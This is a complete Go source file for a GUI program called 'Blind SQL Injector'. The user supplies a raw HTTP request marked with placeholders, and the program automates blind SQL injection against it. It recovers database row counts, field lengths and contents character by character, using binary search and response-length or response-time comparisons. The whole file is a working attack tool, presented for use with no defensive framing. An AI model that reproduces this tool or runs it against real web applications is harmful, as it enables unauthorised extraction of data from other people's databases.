package main

import (
	"bufio"
	"bytes"
	"log"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/andlabs/ui"
)

//进度显示(实际用途不大，只为了让你知道程序在运行了)
func showProgress(p *ui.ProgressBar, c float64, a float64) {
	if c > a {
		c = a
	}
	v := (c / a) * 100
	i := int(v)
	p.SetValue(i)
}

//错误检测
func checkError(err error) {
	if err != nil {
		panic(err)
	}
}

//发包测试
func testRequest(rp string) (re *http.Response, err error) {
	re_b := []byte(rp)
	re_b2 := bytes.NewReader(re_b)
	re_b3 := bufio.NewReader(re_b2)
	r, err := http.ReadRequest(re_b3)
	if err != nil {
		return nil, err
	}
	r.URL.Host = r.Host
	r.URL.Scheme = "http"
	r.RequestURI = ""

	client := &http.Client{}
	response, err := client.Do(r)
	if err != nil {
		return nil, err
	}
	defer response.Body.Close()
	return response, err
}

//修改请求包
func modifyRequest(modifyString string) *http.Request {
	re_b := []byte(modifyString + "\r\n\r\n")
	re_b2 := bytes.NewReader(re_b)
	re_b3 := bufio.NewReader(re_b2)
	r, err := http.ReadRequest(re_b3)
	checkError(err)
	r.URL.Host = r.Host
	r.URL.Scheme = "http"
	r.RequestURI = ""
	return r
}

//布尔判断，求数量
func sqlInjectCount(rawString string, rightLength int64, p *ui.ProgressBar) int {
	p.SetValue(0)
	a := 14.0
	c := 0.0
	f1 := 0
	f2 := 10000
	client := &http.Client{}
	var count int
	for {
		c = c + 1
		showProgress(p, c, a)
		if f1 >= f2 {
			count = 6789
			break
		}
		mid := (f1 + f2) / 2
		midStr := strconv.Itoa(mid)
		modifyString := strings.Replace(rawString, "<$qcount!>", midStr, 1)
		modifyRe := modifyRequest(modifyString)
		response, err := client.Do(modifyRe)
		defer response.Body.Close()
		checkError(err)
		if response.ContentLength == rightLength {
			mid2Str := strconv.Itoa(mid + 1)
			modify2String := strings.Replace(rawString, "<$qcount!>", mid2Str, 1)
			modify2Re := modifyRequest(modify2String)
			response2, err := client.Do(modify2Re)
			checkError(err)
			defer response2.Body.Close()
			if response2.ContentLength != rightLength {
				count = mid + 1
				break
			} else {
				f1 = mid + 1
			}

		} else {
			f2 = mid
		}
	}
	p.SetValue(100)
	return count
}

//布尔判断求长度
func sqlInjectLength(rawString string, count int, rightLength int64, p *ui.ProgressBar) string {
	p.SetValue(0)
	a := float64(count)
	c := 0.0
	result := make([]int, count)
	var wg sync.WaitGroup //同步
	for i := 0; i < count; i++ {
		modifyString := strings.Replace(rawString, "<$count!>", strconv.Itoa(i), 1)
		wg.Add(1)
		go dichotomyLength(modifyString, rightLength, &result, i, &wg, p, &c, a)
	}
	wg.Wait()
	var resultString string
	for i := 0; i < len(result); i++ {
		resultString = resultString + "," + strconv.Itoa(result[i])
	}
	p.SetValue(100)
	return resultString[1:len(resultString)]
}

//二分求长度
func dichotomyLength(rawString string, rightLength int64, result *[]int, result_index int, wg *sync.WaitGroup, p *ui.ProgressBar, c *float64, a float64) {
	f1 := 0
	f2 := 10000
	client := &http.Client{}
	var count int
	for {
		if f1 >= f2 {
			count = 6789
			break
		}
		mid := (f1 + f2) / 2
		midStr := strconv.Itoa(mid)
		modifyString := strings.Replace(rawString, "<$qlength!>", midStr, 1)
		modifyRe := modifyRequest(modifyString)
		response, err := client.Do(modifyRe)
		defer response.Body.Close()
		checkError(err)
		if response.ContentLength == rightLength {
			mid2Str := strconv.Itoa(mid + 1)
			modify2String := strings.Replace(rawString, "<$qlength!>", mid2Str, 1)
			modify2Re := modifyRequest(modify2String)
			response2, err := client.Do(modify2Re)
			checkError(err)
			defer response2.Body.Close()
			if response2.ContentLength != rightLength {
				count = mid + 1
				break
			} else {
				f1 = mid + 1
			}

		} else {
			f2 = mid
		}
	}
	(*result)[result_index] = count
	wg.Done()
	(*c) = (*c) + 1
	showProgress(p, (*c), a)
}

//布尔判断，求内容
func sqlInjectCotent(rawString string, length string, rightLength int64, p *ui.ProgressBar) (resultString string) {
	p.SetValue(0)
	c := 0.0
	la := strings.Split(length, ",")
	a := float64(len(la))
	var result_a string
	for j, v := range la {
		vInt, err := strconv.Atoi(v)
		checkError(err)
		result := make([]int, vInt)
		var result_s string
		var wg sync.WaitGroup
		modifyString1 := strings.Replace(rawString, "<$count!>", strconv.Itoa(j), 1)
		for i := 0; i < vInt; i++ {
			modifyString2 := strings.Replace(modifyString1, "<$length!>", strconv.Itoa(i+1), 1)
			wg.Add(1)
			go dichotomyContent(modifyString2, rightLength, &result, i, &wg, p, &c, a)
		}
		wg.Wait()
		for _, result_v := range result {
			result_s += string(rune(result_v))
		}
		result_a = result_a + result_s + "\r\n"
	}
	p.SetValue(100)
	return result_a
}

//二分，求内容
func dichotomyContent(rawString string, rightLength int64, result *[]int, result_index int, wg *sync.WaitGroup, p *ui.ProgressBar, c *float64, a float64) {
	f1 := 32
	f2 := 127
	client := &http.Client{}
	var ascii int
	for {
		if f1 >= f2 {
			ascii = 42
			break
		}
		mid := (f1 + f2) / 2
		midStr := strconv.Itoa(mid)
		modifyString := strings.Replace(rawString, "<$qascii!>", midStr, 1)
		modifyRe := modifyRequest(modifyString)
		response, err := client.Do(modifyRe)
		defer response.Body.Close()
		checkError(err)
		if response.ContentLength == rightLength {
			mid2Str := strconv.Itoa(mid + 1)
			modify2String := strings.Replace(rawString, "<$qascii!>", mid2Str, 1)
			modify2Re := modifyRequest(modify2String)
			response2, err := client.Do(modify2Re)
			checkError(err)
			defer response2.Body.Close()
			if response2.ContentLength != rightLength {
				ascii = mid + 1
				break
			} else {
				f1 = mid + 1
			}

		} else {
			f2 = mid
		}
	}
	(*result)[result_index] = ascii
	wg.Done()
	(*c) = (*c) + 1
	showProgress(p, (*c), a)
}

//时间判断，求数量
func sqlInjectCountByTime(rawString string, rightTime float64, p *ui.ProgressBar) int {
	p.SetValue(0)
	a := 14.0
	c := 0.0
	f1 := 0
	f2 := 10000
	client := &http.Client{}
	var count int
	for {
		if f1 >= f2 {
			count = 6789
			break
		}
		c = c + 1
		showProgress(p, c, a)
		start := time.Now()
		mid := (f1 + f2) / 2
		midStr := strconv.Itoa(mid)
		modifyString := strings.Replace(rawString, "<$qcount!>", midStr, 1)
		modifyRe := modifyRequest(modifyString)
		response, err := client.Do(modifyRe)
		elapsed := time.Now().Sub(start).Seconds() + 0.1

		defer response.Body.Close()
		checkError(err)
		if elapsed >= rightTime {
			start2 := time.Now()
			mid2Str := strconv.Itoa(mid + 1)
			modify2String := strings.Replace(rawString, "<$qcount!>", mid2Str, 1)
			modify2Re := modifyRequest(modify2String)
			response2, err := client.Do(modify2Re)
			elapsed2 := time.Now().Sub(start2).Seconds() + 0.1
			checkError(err)
			defer response2.Body.Close()
			if elapsed2 < rightTime {
				count = mid + 1
				break
			} else {
				f1 = mid + 1
			}

		} else {
			f2 = mid
		}
	}
	p.SetValue(100)
	return count
}

//时间判断，求长度
func sqlInjectLengthByTime(rawString string, count int, rightTime float64, p *ui.ProgressBar) string {
	p.SetValue(0)
	a := float64(count)
	c := 0.0
	result := make([]int, count)
	for i := 0; i < count; i++ {
		c = c + 1
		showProgress(p, c, a)
		modifyString := strings.Replace(rawString, "<$count!>", strconv.Itoa(i), 1)
		dichotomyLengthByTime(modifyString, rightTime, &result, i)
	}
	var resultString string
	for i := 0; i < len(result); i++ {
		resultString = resultString + "," + strconv.Itoa(result[i])
	}
	p.SetValue(100)
	return resultString[1:len(resultString)]
}

//二分求长度
func dichotomyLengthByTime(rawString string, rightTime float64, result *[]int, result_index int) {
	f1 := 0
	f2 := 10000
	client := &http.Client{}
	var count int
	for {
		if f1 >= f2 {
			count = 6789
			break
		}
		start := time.Now()
		mid := (f1 + f2) / 2
		midStr := strconv.Itoa(mid)
		modifyString := strings.Replace(rawString, "<$qlength!>", midStr, 1)
		modifyRe := modifyRequest(modifyString)
		response, err := client.Do(modifyRe)
		elapsed := time.Now().Sub(start).Seconds() + 0.1
		defer response.Body.Close()
		checkError(err)
		if elapsed >= rightTime {
			start2 := time.Now()
			mid2Str := strconv.Itoa(mid + 1)
			modify2String := strings.Replace(rawString, "<$qlength!>", mid2Str, 1)
			modify2Re := modifyRequest(modify2String)
			response2, err := client.Do(modify2Re)
			checkError(err)
			elapsed2 := time.Now().Sub(start2).Seconds() + 0.1
			defer response2.Body.Close()
			if elapsed2 < rightTime {
				count = mid + 1
				break
			} else {
				f1 = mid + 1
			}

		} else {
			f2 = mid
		}
	}
	(*result)[result_index] = count
}

//时间判断，求内容
func sqlInjectCotentByTime(rawString string, length string, rightTime float64, p *ui.ProgressBar) (resultString string) {
	la := strings.Split(length, ",")
	p.SetValue(0)
	a := float64(len(la))
	c := 0.0
	var result_a string
	for j, v := range la {
		c = c + 1
		showProgress(p, c, a)
		vInt, err := strconv.Atoi(v)
		checkError(err)
		result := make([]int, vInt)
		var result_s string
		modifyString1 := strings.Replace(rawString, "<$count!>", strconv.Itoa(j), 1)
		for i := 0; i < vInt; i++ {
			modifyString2 := strings.Replace(modifyString1, "<$length!>", strconv.Itoa(i+1), 1)
			dichotomyContentByTime(modifyString2, rightTime, &result, i)
		}
		for _, result_v := range result {
			result_s += string(rune(result_v))
		}
		result_a = result_a + result_s + "\r\n"
	}
	p.SetValue(100)
	return result_a
}

//二分，求内容
func dichotomyContentByTime(rawString string, rightTime float64, result *[]int, result_index int) {
	f1 := 32
	f2 := 127
	client := &http.Client{}
	var ascii int
	for {
		if f1 >= f2 {
			ascii = 42
			break
		}
		start := time.Now()
		mid := (f1 + f2) / 2
		midStr := strconv.Itoa(mid)
		modifyString := strings.Replace(rawString, "<$qascii!>", midStr, 1)
		modifyRe := modifyRequest(modifyString)
		response, err := client.Do(modifyRe)
		elapsed := time.Now().Sub(start).Seconds() + 0.1
		defer response.Body.Close()
		checkError(err)
		log.Println(elapsed, mid)
		if elapsed >= rightTime {
			start2 := time.Now()
			mid2Str := strconv.Itoa(mid + 1)
			modify2String := strings.Replace(rawString, "<$qascii!>", mid2Str, 1)
			modify2Re := modifyRequest(modify2String)
			response2, err := client.Do(modify2Re)
			checkError(err)
			elapsed2 := time.Now().Sub(start2).Seconds() + 0.1
			log.Println(elapsed2, string(rune(mid+1)))
			defer response2.Body.Close()
			if elapsed2 < rightTime {
				ascii = mid + 1
				break
			} else {
				f1 = mid + 1
			}

		} else {
			f2 = mid
		}
	}
	(*result)[result_index] = ascii

}

//主程序
func main() {
	err := ui.Main(func() {
		var resultLog string                                                         //log result
		window := ui.NewWindow("Blind SQL Injector by Releasel0ck", 800, 600, false) //main window
		window.SetMargined(true)                                                     //SetMargined controls whether the Group has margins around its child.
		vb := ui.NewVerticalBox()                                                    //vertical Box
		window.SetChild(vb)

		meRequestPacket := ui.NewMultilineEntry()
		gp1 := ui.NewGroup("Input Value:")
		gp2 := ui.NewGroup("Correct judgment:")
		hb := ui.NewHorizontalBox()
		meResult := ui.NewMultilineEntry()
		pb := ui.NewProgressBar()
		pb.SetValue(0)
		vb.Append(meRequestPacket, true)
		vb.Append(gp1, false)
		vb.Append(gp2, false)
		vb.Append(hb, false)
		vb.Append(meResult, true)
		vb.Append(pb, false)

		hb1 := ui.NewHorizontalBox()
		lbLength := ui.NewLabel("Length:  ")
		etLength := ui.NewEntry()
		etLength.SetText("10,10,10,10,10,10,10,10,10,10,10,10,10,10")
		lbCount := ui.NewLabel("  Count:  ")
		etCount := ui.NewEntry()
		hb1.Append(lbLength, false)
		hb1.Append(etLength, true)
		hb1.Append(lbCount, false)
		hb1.Append(etCount, true)
		gp1.SetChild(hb1)

		hb2 := ui.NewHorizontalBox()
		cbxLength := ui.NewCheckbox("Length")
		cbxLength.SetChecked(true)
		etrLength := ui.NewEntry()
		etrLength.SetText("439")
		cbxTime := ui.NewCheckbox("Time")
		etrTime := ui.NewEntry()
		hb2.Append(cbxLength, false)
		hb2.Append(etrLength, true)
		hb2.Append(cbxTime, false)
		hb2.Append(etrTime, true)
		gp2.SetChild(hb2)

		btnSendTest := ui.NewButton("Send test packet")
		btnInject := ui.NewButton("Get injected content")
		hb.Append(btnSendTest, true)
		hb.Append(btnInject, true)

		cbxLength.OnToggled(func(*ui.Checkbox) {
			cbxTime.SetChecked(false)
			etrLength.SetText("439")
			etrTime.SetText("")
		})
		cbxTime.OnToggled(func(*ui.Checkbox) {
			cbxLength.SetChecked(false)
			etrTime.SetText("3")
			etrLength.SetText("")
		})

		//Send test packet button
		btnSendTest.OnClicked(func(_ *ui.Button) {
			go func() {
				start := time.Now()
				r, err := testRequest(meRequestPacket.Text())
				if err != nil {
					ui.MsgBoxError(window, "Error!", err.Error())
				} else {
					tmp := "Content-Length: " + strings.Join(r.Header["Content-Length"], "") + "\r\n"
					elapsed := time.Now().Sub(start).Seconds()
					tmp = tmp + "Time: " + strconv.FormatFloat(elapsed, 'G', 2, 64) + "\r\n"
					tmp = tmp + "Status: " + strconv.Itoa(r.StatusCode) + "\r\n"
					resultLog = resultLog + tmp
					meResult.SetText(resultLog)
				}
			}()
		})

		//Get injected content Button
		btnInject.OnClicked(func(_ *ui.Button) {
			if cbxLength.Checked() {
				rightLength, err := strconv.ParseInt(etrLength.Text(), 10, 64)
				if err != nil {
					ui.MsgBoxError(window, "Error!", "Wrong Length,Integer!")
				} else {
					go func() {
						if strings.Contains(meRequestPacket.Text(), "<$qcount!>") {
							//get count
							count := sqlInjectCount(meRequestPacket.Text(), rightLength, pb)
							resultLog = resultLog + "Count: " + strconv.Itoa(count) + "\r\n"
							meResult.SetText(resultLog)
							etCount.SetText(strconv.Itoa(count))

						} else if strings.Contains(meRequestPacket.Text(), "<$count!>") && strings.Contains(meRequestPacket.Text(), "<$qlength!>") {
							//get length
							count, err := strconv.Atoi(etCount.Text())
							if err != nil {
								ui.MsgBoxError(window, "Error!", "Wrong count,Integer!")
							}
							length := sqlInjectLength(meRequestPacket.Text(), count, rightLength, pb)

							resultLog = resultLog + "Length: " + length + "\r\n"
							etLength.SetText(length)
							meResult.SetText(resultLog)

						} else if strings.Contains(meRequestPacket.Text(), "<$qascii!>") && strings.Contains(meRequestPacket.Text(), "<$length!>") && strings.Contains(meRequestPacket.Text(), "<$count!>") {
							//get content
							length := etLength.Text()
							content := sqlInjectCotent(meRequestPacket.Text(), length, rightLength, pb)
							resultLog = resultLog + "Content: " + "\r\n" + content + "\r\n"
							meResult.SetText(resultLog)
						} else {
							ui.MsgBoxError(window, "Error!", "Wrong Mark!")
						}
					}()
				}
			}
			if cbxTime.Checked() {
				rightTime, err := strconv.ParseFloat(etrTime.Text(), 64)
				if err != nil {
					ui.MsgBoxError(window, "Error!", "Wrong Time,Integer!")
				} else {
					go func() {
						if strings.Contains(meRequestPacket.Text(), "<$qcount!>") {
							count := sqlInjectCountByTime(meRequestPacket.Text(), rightTime, pb)
							resultLog = resultLog + "Count: " + strconv.Itoa(count) + "\r\n"
							meResult.SetText(resultLog)
							etCount.SetText(strconv.Itoa(count))
						} else if strings.Contains(meRequestPacket.Text(), "<$count!>") && strings.Contains(meRequestPacket.Text(), "<$qlength!>") {
							//get length
							count, err := strconv.Atoi(etCount.Text())
							if err != nil {
								ui.MsgBoxError(window, "Error!", "Wrong count,Integer!")
							}
							length := sqlInjectLengthByTime(meRequestPacket.Text(), count, rightTime, pb)
							resultLog = resultLog + "Length: " + length + "\r\n"
							meResult.SetText(resultLog)
							etLength.SetText(length)
						} else if strings.Contains(meRequestPacket.Text(), "<$qascii!>") && strings.Contains(meRequestPacket.Text(), "<$length!>") && strings.Contains(meRequestPacket.Text(), "<$count!>") {
							//get content
							length := etLength.Text()
							content := sqlInjectCotentByTime(meRequestPacket.Text(), length, rightTime, pb)
							resultLog = resultLog + "Content: " + "\r\n" + content + "\r\n"
							meResult.SetText(resultLog)
						} else {
							ui.MsgBoxError(window, "Error!", "Wrong Packet!")
						}
					}()
				}
			}
		})
		window.OnClosing(func(*ui.Window) bool {
			ui.Quit()
			return true
		})
		window.Show()
	})
	checkError(err)
}
